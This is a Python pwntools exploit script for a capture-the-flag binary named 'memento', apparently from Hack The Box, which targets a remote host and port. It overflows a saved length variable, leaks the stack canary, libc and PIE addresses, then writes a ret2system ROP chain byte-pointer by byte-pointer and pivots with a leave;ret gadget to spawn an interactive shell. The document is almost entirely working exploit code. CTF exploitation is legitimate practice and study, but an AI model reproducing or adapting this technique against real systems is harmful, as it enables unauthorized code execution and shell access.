#!/usr/bin/env python3

from pwn import *

exe = ELF("./memento_patched")
libc = ELF("./libc_chall.so", checksec = False)
# libc = exe.libc

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, "break reset\nbreak *remember+157")
    else:
        r = remote("94.237.58.137", 39003)

    return r


def remember(length: int, data: bytes):
    payload = b"A" + p8(length) + data
    r.send(payload)


def recall(nbytes: int) -> bytes:
    r.clean(1)
    r.send(b"B")
    return r.recvn(nbytes)


def reset():
    r.send(b"C")


# NOTE: I didn't manage to submit the flag since I don't know where's located
#       but I got the shell, so for not it's fine as is
def main():
    r = conn()

    # Get in the loop
    r.sendline(b"HTB{}")

    # Overflow the length variable saved in the stack
    remember(24, b"A" * 24)
    remember(2, p8(0xFF) + p8(0))

    # Leak data in the stack
    leak = recall(0x100)
    leak = leak[2:] if leak[:2] == b":(" else leak

    buffer = u64(leak[32:40]) - 0x19
    canary = u64(leak[40:48])
    libc.address = u64(leak[56:64]) - (libc.sym.__libc_start_call_main + 122)   # - 0x2a1ca
    exe.address = u64(leak[88:96]) - exe.sym.main

    log.info(f"buffer: 0x{buffer:x}")
    log.info(f"canary: 0x{canary:x}")
    log.info(f"libc: 0x{libc.address:x}")
    log.info(f"pie: 0x{exe.address:x}")

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    leave   = rop.find_gadget(['leave', 'ret'])[0]

    # Reset and change the buffer pointer in the function arguments to the stack
    # address that will contain our "ret2system" payload; we'll need to write it
    # round by round, by calling `remember()` and changing the pointer each time.
    # We need to pray that it lies inside the same 0x100 bytes and we need to take
    # into account that the buffer pointer will be incremented each read
    reset()
    remember(24, b"A" * 24)
    remember(17, p64(0x0) + p8((buffer - 0x28 - 0x1) & 0xFF) + p64(pop_rdi))

    reset()
    remember(24, b"A" * 24)
    remember(17, p64(0x0) + p8((buffer - 0x20 - 0x1) & 0xFF) + p64(libc.search(b"/bin/sh\x00").__next__()))

    reset()
    remember(24, b"A" * 24)
    remember(17, p64(0x0) + p8((buffer - 0x18 - 0x1) & 0xFF) + p64(pop_rdi + 1))

    reset()
    remember(24, b"A" * 24)
    remember(17, p64(0x0) + p8((buffer - 0x10 - 0x1) & 0xFF) + p64(libc.sym["system"]))

    # Now we need to change the return address of `remember()` to a "leave; ret;" gadget
    # so that the program exits the loop and returns to our chain.
    # NOTE: it might require a few tries before popping a shell correctly
    reset()
    remember(24, b"A" * 24)
    remember(17, p64(0x0) + p8((buffer - 0x48 - 0x1) & 0xFF) + p64(leave))

    ''' NOTE: The function currently being executed is `remember()`

    pwndbg> stack 0x18
    00:0000│ rsp 0x7fff3edb9c90 —▸ 0x7fff3edb9e48 —▸ 0x7fff3edbc027 ◂— '/home/thomas/Desktop/768/memento'
    01:0008│     0x7fff3edb9c98 —▸ 0x7fff3edb9cf0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAA'
    02:0010│ rbp 0x7fff3edb9ca0 —▸ 0x7fff3edb9cc0 —▸ 0x7fff3edb9d20 —▸ 0x7fff3edb9dc0 —▸ 0x7fff3edb9e20 ◂— ...
    03:0018│     0x7fff3edb9ca8 —▸ 0x5a3a75fcd395 (loop+181) ◂— jmp 0x5a3a75fcd3a3
    04:0020│     0x7fff3edb9cb0 ◂— 0x4200000042 /* 'B' */
    05:0028│     0x7fff3edb9cb8 —▸ 0x7fff3edb9cf0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAA'     ◂—————— FUNCTION ARGUMENT (BUF. PTR.)
    06:0030│     0x7fff3edb9cc0 —▸ 0x7fff3edb9d20 —▸ 0x7fff3edb9dc0 —▸ 0x7fff3edb9e20 ◂— 0x0
    07:0038│     0x7fff3edb9cc8 —▸ 0x5a3a75fcd4e5 (main+309) ◂— mov eax, dword ptr [rbp - 0x34]
    08:0040│     0x7fff3edb9cd0 ◂— 0x0
    09:0048│     0x7fff3edb9cd8 ◂— 0x0
    0a:0050│     0x7fff3edb9ce0 ◂— 0x4
    0b:0058│     0x7fff3edb9ce8 ◂— 0x7d /* '}' */
    0c:0060│     0x7fff3edb9cf0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAA'  ◂——————— BUFFER
    ... ↓        2 skipped
    0f:0078│     0x7fff3edb9d08 ◂— 0x100    ◂—————— LENGTH
    10:0080│     0x7fff3edb9d10 —▸ 0x7fff3edb9d09 ◂— 0x900000000000001  ◂—————— CURRENT BUFFER POINTER
    11:0088│     0x7fff3edb9d18 ◂— 0xbc0ef86abdc3ac00
    12:0090│     0x7fff3edb9d20 —▸ 0x7fff3edb9dc0 —▸ 0x7fff3edb9e20 ◂— 0x0
    13:0098│     0x7fff3edb9d28 —▸ 0x7c0f5822a1ca (__libc_start_call_main+122) ◂— mov edi, eax
    14:00a0│     0x7fff3edb9d30 —▸ 0x7fff3edb9d70 —▸ 0x5a3a75fcfd70 —▸ 0x5a3a75fcd150 ◂— endbr64
    '''

    r.interactive("$ ")


if __name__ == "__main__":
    main()
